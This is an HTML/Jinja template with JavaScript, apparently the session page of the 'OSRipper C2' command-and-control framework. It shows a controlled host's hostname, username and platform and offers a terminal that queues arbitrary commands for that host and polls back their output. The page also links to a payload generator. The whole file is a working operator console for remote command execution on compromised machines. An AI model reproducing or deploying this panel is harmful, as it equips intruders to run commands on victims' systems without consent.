<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSRipper C2 - Session {{ session.session_id[:16] }}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body class="dark-theme">
    <nav class="navbar navbar-dark">
        <div class="container-fluid">
            <span class="navbar-brand mb-0 h1">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="me-2" style="display: inline-block; vertical-align: middle;">
                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
                </svg>
                OSRipper C2
            </span>
            <div>
                <a href="/generate" class="btn btn-outline-light btn-sm me-2">Generate Payload</a>
                <a href="/" class="btn btn-outline-light btn-sm">Dashboard</a>
            </div>
        </div>
    </nav>

    <div class="container-fluid mt-4">
        <div class="row">
            <div class="col-lg-4 col-md-5 mb-4">
                <div class="card dark-card">
                    <div class="card-header">
                        <h5 class="mb-0">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="me-2" style="display: inline-block; vertical-align: middle;">
                                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
                                <line x1="9" y1="3" x2="9" y2="21"></line>
                                <line x1="3" y1="9" x2="21" y2="9"></line>
                            </svg>
                            Session Details
                        </h5>
                    </div>
                    <div class="card-body">
                        <div class="info-item mb-3">
                            <label class="info-label">Session ID</label>
                            <div class="info-value">
                                <code class="session-id">{{ session.session_id }}</code>
                            </div>
                        </div>
                        <div class="info-item mb-3">
                            <label class="info-label">Hostname</label>
                            <div class="info-value">{{ session.hostname or 'N/A' }}</div>
                        </div>
                        <div class="info-item mb-3">
                            <label class="info-label">Username</label>
                            <div class="info-value">{{ session.username or 'N/A' }}</div>
                        </div>
                        <div class="info-item mb-3">
                            <label class="info-label">Platform</label>
                            <div class="info-value small-text">{{ session.platform or 'N/A' }}</div>
                        </div>
                        <div class="info-item mb-3">
                            <label class="info-label">Last Seen</label>
                            <div class="info-value">{{ session.last_seen }}</div>
                        </div>
                        <div class="info-item">
                            <label class="info-label">Status</label>
                            <div class="info-value">
                                <span class="badge status-badge">Active</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-lg-8 col-md-7">
                <div class="card dark-card">
                    <div class="card-header">
                        <h5 class="mb-0">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="me-2" style="display: inline-block; vertical-align: middle;">
                                <polyline points="9 11 12 14 22 4"></polyline>
                                <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
                            </svg>
                            Command Terminal
                        </h5>
                    </div>
                    <div class="card-body">
                        <div class="command-input-wrapper mb-3">
                            <div class="input-group">
                                <span class="input-group-text command-prompt">
                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <polyline points="9 11 12 14 22 4"></polyline>
                                        <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
                                    </svg>
                                </span>
                                <input type="text" 
                                       class="form-control command-input" 
                                       id="command-input" 
                                       placeholder="Enter command to execute..."
                                       autocomplete="off">
                                <button class="btn btn-primary send-button" onclick="sendCommand()">
                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="me-1">
                                        <line x1="22" y1="2" x2="11" y2="13"></line>
                                        <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
                                    </svg>
                                    Send
                                </button>
                            </div>
                        </div>
                        <div class="output-wrapper">
                            <div class="output-header">
                                <span class="output-label">Output</span>
                                <span class="output-status" id="output-status"></span>
                            </div>
                            <div class="terminal-output" id="output-content">
                                <div class="terminal-placeholder">Waiting for command execution...</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const sessionId = '{{ session.session_id }}';
        let pollingInterval = null;
        
        function sendCommand() {
            const command = document.getElementById('command-input').value.trim();
            if (!command) return;
            
            const outputContent = document.getElementById('output-content');
            const outputStatus = document.getElementById('output-status');
            
            // Disable input and show loading
            document.getElementById('command-input').disabled = true;
            outputStatus.textContent = 'Sending...';
            outputStatus.className = 'output-status status-sending';
            outputContent.innerHTML = '<div class="terminal-placeholder">Command queued. Waiting for response...</div>';
            
            fetch(`/api/session/${sessionId}/command`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ command: command })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('command-input').value = '';
                document.getElementById('command-input').disabled = false;
                document.getElementById('command-input').focus();
                outputStatus.textContent = 'Waiting...';
                outputStatus.className = 'output-status status-waiting';
                
                // Start polling for response
                startPolling();
            })
            .catch(error => {
                outputContent.innerHTML = `<div class="terminal-error">Error: ${error.message}</div>`;
                outputStatus.textContent = 'Error';
                outputStatus.className = 'output-status status-error';
                document.getElementById('command-input').disabled = false;
            });
        }
        
        function startPolling() {
            // Clear any existing polling
            if (pollingInterval) {
                clearInterval(pollingInterval);
            }
            
            // Poll immediately, then every 2 seconds
            pollForResponse();
            pollingInterval = setInterval(pollForResponse, 2000);
        }
        
        function pollForResponse() {
            fetch(`/api/session/${sessionId}/history?limit=1`)
                .then(response => response.json())
                .then(data => {
                    if (data.length > 0) {
                        const latest = data[0];
                        const outputContent = document.getElementById('output-content');
                        const outputStatus = document.getElementById('output-status');
                        
                        if (latest.response && latest.response !== 'Waiting for response...') {
                            // Format the response nicely
                            const formatted = formatResponse(latest.response);
                            outputContent.innerHTML = formatted;
                            outputStatus.textContent = 'Complete';
                            outputStatus.className = 'output-status status-complete';
                            
                            // Stop polling once we have a response
                            if (pollingInterval) {
                                clearInterval(pollingInterval);
                                pollingInterval = null;
                            }
                        } else {
                            outputStatus.textContent = 'Waiting...';
                            outputStatus.className = 'output-status status-waiting';
                        }
                    }
                })
                .catch(error => {
                    console.error('Polling error:', error);
                });
        }
        
        function formatResponse(response) {
            if (!response) return '<div class="terminal-placeholder">No output</div>';
            
            // Parse the response format: RETCODE: X\nCWD: path\nSTDOUT: ...\nSTDERR: ...
            const lines = response.split('\n');
            let retcode = '';
            let cwd = '';
            let stdout = '';
            let stderr = '';
            
            for (const line of lines) {
                if (line.startsWith('RETCODE:')) {
                    retcode = line.substring(8).trim();
                } else if (line.startsWith('CWD:')) {
                    cwd = line.substring(4).trim();
                } else if (line.startsWith('STDOUT:')) {
                    stdout = line.substring(7).trim();
                } else if (line.startsWith('STDERR:')) {
                    stderr = line.substring(7).trim();
                } else if (stdout !== null && !line.startsWith('RETCODE:') && !line.startsWith('CWD:') && !line.startsWith('STDERR:')) {
                    // Continuation of stdout
                    if (stdout) stdout += '\n' + line;
                    else stdout = line;
                }
            }
            
            let html = '';
            if (cwd) {
                html += `<div class="terminal-meta"><span class="meta-label">CWD:</span> <span class="meta-value">${escapeHtml(cwd)}</span></div>`;
            }
            if (retcode !== '') {
                const retcodeClass = retcode === '0' ? 'return-success' : 'return-error';
                html += `<div class="terminal-meta"><span class="meta-label">Return Code:</span> <span class="meta-value ${retcodeClass}">${escapeHtml(retcode)}</span></div>`;
            }
            if (stdout) {
                html += `<div class="terminal-stdout">${escapeHtml(stdout)}</div>`;
            }
            if (stderr) {
                html += `<div class="terminal-stderr">${escapeHtml(stderr)}</div>`;
            }
            if (!stdout && !stderr) {
                html = '<div class="terminal-placeholder">No output</div>';
            }
            
            return html;
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Allow Enter key to send command
        document.getElementById('command-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendCommand();
            }
        });
        
        // Focus input on load
        document.getElementById('command-input').focus();
    </script>
</body>
</html>
